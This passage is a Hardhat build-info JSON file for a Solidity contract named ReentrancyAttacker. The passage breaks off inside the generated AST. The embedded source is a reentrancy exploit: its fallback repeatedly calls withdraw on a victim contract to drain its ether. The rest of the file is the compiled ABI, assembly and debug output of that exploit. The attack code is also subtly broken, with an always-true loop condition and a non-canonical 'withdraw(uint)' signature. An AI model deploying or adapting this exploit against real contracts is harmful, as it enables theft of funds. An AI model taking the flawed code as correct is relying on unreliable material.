{
	"id": "4014767d17b1bfc6ba4f9f2ec8dfc6ed",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.15",
	"solcLongVersion": "0.8.15+commit.e14f2714",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/ReentrancyAttack.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract ReentrancyAttacker {\r\n    address s_victimContractAddress;\r\n    uint s_amount = 13008896;\r\n\r\n    constructor (address _victimContractAddress) payable {\r\n        s_victimContractAddress = _victimContractAddress;\r\n    }\r\n\r\n    function attack() internal {\r\n        while(s_victimContractAddress.balance >= 0){\r\n        s_victimContractAddress.call(abi.encodeWithSignature(\"withdraw(uint)\", s_amount));\r\n        }\r\n    }\r\n\r\n    fallback() external payable {\r\n        attack();\r\n    }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contracts/ReentrancyAttack.sol": {
				"ReentrancyAttacker": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_victimContractAddress",
									"type": "address"
								}
							],
							"stateMutability": "payable",
							"type": "constructor"
						},
						{
							"stateMutability": "payable",
							"type": "fallback"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/ReentrancyAttack.sol\":60:552  contract ReentrancyAttacker {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/ReentrancyAttack.sol\":149:157  13008896 */\n  0xc68000\n    /* \"contracts/ReentrancyAttack.sol\":133:157  uint s_amount = 13008896 */\n  0x01\n  sstore\n    /* \"contracts/ReentrancyAttack.sol\":166:286  constructor (address _victimContractAddress) payable {... */\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_1\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n    /* \"contracts/ReentrancyAttack.sol\":256:278  _victimContractAddress */\n  dup1\n    /* \"contracts/ReentrancyAttack.sol\":230:253  s_victimContractAddress */\n  0x00\n  dup1\n    /* \"contracts/ReentrancyAttack.sol\":230:278  s_victimContractAddress = _victimContractAddress */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/ReentrancyAttack.sol\":166:286  constructor (address _victimContractAddress) payable {... */\n  pop\n    /* \"contracts/ReentrancyAttack.sol\":60:552  contract ReentrancyAttacker {... */\n  jump(tag_5)\n    /* \"#utility.yul\":88:205   */\ntag_7:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_9:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_10:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_19\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_9\n  jump\t// in\ntag_19:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_11:\n    /* \"#utility.yul\":641:665   */\n  tag_21\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_22\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_22:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_12:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_24\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_11\n  jump\t// in\ntag_24:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_2:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_26\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_27\n  tag_7\n  jump\t// in\ntag_27:\n    /* \"#utility.yul\":932:1051   */\ntag_26:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_28\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_12\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/ReentrancyAttack.sol\":60:552  contract ReentrancyAttacker {... */\ntag_5:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/ReentrancyAttack.sol\":60:552  contract ReentrancyAttacker {... */\n      mstore(0x40, 0x80)\n        /* \"contracts/ReentrancyAttack.sol\":533:541  attack() */\n      tag_5\n        /* \"contracts/ReentrancyAttack.sol\":533:539  attack */\n      tag_6\n        /* \"contracts/ReentrancyAttack.sol\":533:541  attack() */\n      jump\t// in\n    tag_5:\n        /* \"contracts/ReentrancyAttack.sol\":60:552  contract ReentrancyAttacker {... */\n      stop\n        /* \"contracts/ReentrancyAttack.sol\":294:486  function attack() internal {... */\n    tag_6:\n        /* \"contracts/ReentrancyAttack.sol\":332:479  while(s_victimContractAddress.balance >= 0){... */\n    tag_8:\n        /* \"contracts/ReentrancyAttack.sol\":373:374  0 */\n      0x00\n        /* \"contracts/ReentrancyAttack.sol\":338:361  s_victimContractAddress */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttack.sol\":338:369  s_victimContractAddress.balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"contracts/ReentrancyAttack.sol\":338:374  s_victimContractAddress.balance >= 0 */\n      lt\n        /* \"contracts/ReentrancyAttack.sol\":332:479  while(s_victimContractAddress.balance >= 0){... */\n      tag_9\n      jumpi\n        /* \"contracts/ReentrancyAttack.sol\":386:409  s_victimContractAddress */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttack.sol\":386:414  s_victimContractAddress.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttack.sol\":457:465  s_amount */\n      sload(0x01)\n        /* \"contracts/ReentrancyAttack.sol\":415:466  abi.encodeWithSignature(\"withdraw(uint)\", s_amount) */\n      add(0x24, mload(0x40))\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x8ba1456200000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/ReentrancyAttack.sol\":386:467  s_victimContractAddress.call(abi.encodeWithSignature(\"withdraw(uint)\", s_amount)) */\n      mload(0x40)\n      tag_12\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_16\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_15)\n    tag_16:\n      0x60\n      swap2\n      pop\n    tag_15:\n      pop\n      pop\n      pop\n        /* \"contracts/ReentrancyAttack.sol\":332:479  while(s_victimContractAddress.balance >= 0){... */\n      jump(tag_8)\n    tag_9:\n        /* \"contracts/ReentrancyAttack.sol\":294:486  function attack() internal {... */\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_17:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_18:\n        /* \"#utility.yul\":177:201   */\n      tag_26\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_17\n      jump\t// in\n    tag_26:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_11:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_28\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_18\n      jump\t// in\n    tag_28:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":442:540   */\n    tag_19:\n        /* \"#utility.yul\":493:499   */\n      0x00\n        /* \"#utility.yul\":527:532   */\n      dup2\n        /* \"#utility.yul\":521:533   */\n      mload\n        /* \"#utility.yul\":511:533   */\n      swap1\n      pop\n        /* \"#utility.yul\":442:540   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":546:693   */\n    tag_20:\n        /* \"#utility.yul\":647:658   */\n      0x00\n        /* \"#utility.yul\":684:687   */\n      dup2\n        /* \"#utility.yul\":669:687   */\n      swap1\n      pop\n        /* \"#utility.yul\":546:693   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":699:1006   */\n    tag_21:\n        /* \"#utility.yul\":767:768   */\n      0x00\n        /* \"#utility.yul\":777:890   */\n    tag_32:\n        /* \"#utility.yul\":791:797   */\n      dup4\n        /* \"#utility.yul\":788:789   */\n      dup2\n        /* \"#utility.yul\":785:798   */\n      lt\n        /* \"#utility.yul\":777:890   */\n      iszero\n      tag_34\n      jumpi\n        /* \"#utility.yul\":876:877   */\n      dup1\n        /* \"#utility.yul\":871:874   */\n      dup3\n        /* \"#utility.yul\":867:878   */\n      add\n        /* \"#utility.yul\":861:879   */\n      mload\n        /* \"#utility.yul\":857:858   */\n      dup2\n        /* \"#utility.yul\":852:855   */\n      dup5\n        /* \"#utility.yul\":848:859   */\n      add\n        /* \"#utility.yul\":841:880   */\n      mstore\n        /* \"#utility.yul\":813:815   */\n      0x20\n        /* \"#utility.yul\":810:811   */\n      dup2\n        /* \"#utility.yul\":806:816   */\n      add\n        /* \"#utility.yul\":801:816   */\n      swap1\n      pop\n        /* \"#utility.yul\":777:890   */\n      jump(tag_32)\n    tag_34:\n        /* \"#utility.yul\":908:914   */\n      dup4\n        /* \"#utility.yul\":905:906   */\n      dup2\n        /* \"#utility.yul\":902:915   */\n      gt\n        /* \"#utility.yul\":899:1000   */\n      iszero\n      tag_35\n      jumpi\n        /* \"#utility.yul\":988:989   */\n      0x00\n        /* \"#utility.yul\":979:985   */\n      dup5\n        /* \"#utility.yul\":974:977   */\n      dup5\n        /* \"#utility.yul\":970:986   */\n      add\n        /* \"#utility.yul\":963:990   */\n      mstore\n        /* \"#utility.yul\":899:1000   */\n    tag_35:\n        /* \"#utility.yul\":748:1006   */\n      pop\n        /* \"#utility.yul\":699:1006   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1012:1385   */\n    tag_22:\n        /* \"#utility.yul\":1116:1119   */\n      0x00\n        /* \"#utility.yul\":1144:1182   */\n      tag_37\n        /* \"#utility.yul\":1176:1181   */\n      dup3\n        /* \"#utility.yul\":1144:1182   */\n      tag_19\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":1198:1286   */\n      tag_38\n        /* \"#utility.yul\":1279:1285   */\n      dup2\n        /* \"#utility.yul\":1274:1277   */\n      dup6\n        /* \"#utility.yul\":1198:1286   */\n      tag_20\n      jump\t// in\n    tag_38:\n        /* \"#utility.yul\":1191:1286   */\n      swap4\n      pop\n        /* \"#utility.yul\":1295:1347   */\n      tag_39\n        /* \"#utility.yul\":1340:1346   */\n      dup2\n        /* \"#utility.yul\":1335:1338   */\n      dup6\n        /* \"#utility.yul\":1328:1332   */\n      0x20\n        /* \"#utility.yul\":1321:1326   */\n      dup7\n        /* \"#utility.yul\":1317:1333   */\n      add\n        /* \"#utility.yul\":1295:1347   */\n      tag_21\n      jump\t// in\n    tag_39:\n        /* \"#utility.yul\":1372:1378   */\n      dup1\n        /* \"#utility.yul\":1367:1370   */\n      dup5\n        /* \"#utility.yul\":1363:1379   */\n      add\n        /* \"#utility.yul\":1356:1379   */\n      swap2\n      pop\n        /* \"#utility.yul\":1120:1385   */\n      pop\n        /* \"#utility.yul\":1012:1385   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1391:1662   */\n    tag_13:\n        /* \"#utility.yul\":1521:1524   */\n      0x00\n        /* \"#utility.yul\":1543:1636   */\n      tag_41\n        /* \"#utility.yul\":1632:1635   */\n      dup3\n        /* \"#utility.yul\":1623:1629   */\n      dup5\n        /* \"#utility.yul\":1543:1636   */\n      tag_22\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":1536:1636   */\n      swap2\n      pop\n        /* \"#utility.yul\":1653:1656   */\n      dup2\n        /* \"#utility.yul\":1646:1656   */\n      swap1\n      pop\n        /* \"#utility.yul\":1391:1662   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122008832061b007063726229aea01da18f2a78ad390f033441ca3727eeac422febd64736f6c634300080f0033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_16": {
									"entryPoint": null,
									"id": 16,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"abi_decode_t_address_fromMemory": {
									"entryPoint": 192,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address_fromMemory": {
									"entryPoint": 213,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 151,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 119,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 114,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 169,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1199:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "47:35:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "57:19:1",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "73:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "67:9:1"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:1"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "40:6:1",
														"type": ""
													}
												],
												"src": "7:75:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "177:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "194:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "197:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "187:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "187:12:1"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "300:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "317:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "320:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "310:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "310:12:1"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "379:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "389:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "411:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "400:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "361:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "371:7:1",
														"type": ""
													}
												],
												"src": "334:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "511:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "521:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "532:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "493:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "503:7:1",
														"type": ""
													}
												],
												"src": "466:96:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "611:79:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "668:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "677:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "680:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "670:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "670:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "670:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "659:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nodeType": "YulIdentifier",
																					"src": "641:17:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "641:24:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "631:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "631:35:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "624:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "624:43:1"
															},
															"nodeType": "YulIf",
															"src": "621:63:1"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "604:5:1",
														"type": ""
													}
												],
												"src": "568:122:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "759:80:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "769:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "784:6:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "778:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "778:13:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "769:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "827:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "800:26:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "800:33:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "800:33:1"
														}
													]
												},
												"name": "abi_decode_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "737:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "745:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "753:5:1",
														"type": ""
													}
												],
												"src": "696:143:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "922:274:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "968:83:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "970:77:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "970:79:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "970:79:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "943:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "952:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "939:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "939:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "964:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "935:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "935:32:1"
															},
															"nodeType": "YulIf",
															"src": "932:119:1"
														},
														{
															"nodeType": "YulBlock",
															"src": "1061:128:1",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "1076:15:1",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1090:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "1080:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "1105:74:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "1151:9:1"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "1162:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "1147:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1147:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "1171:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "1115:31:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1115:64:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "1105:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "892:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "903:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "915:6:1",
														"type": ""
													}
												],
												"src": "845:351:1"
											}
										]
									},
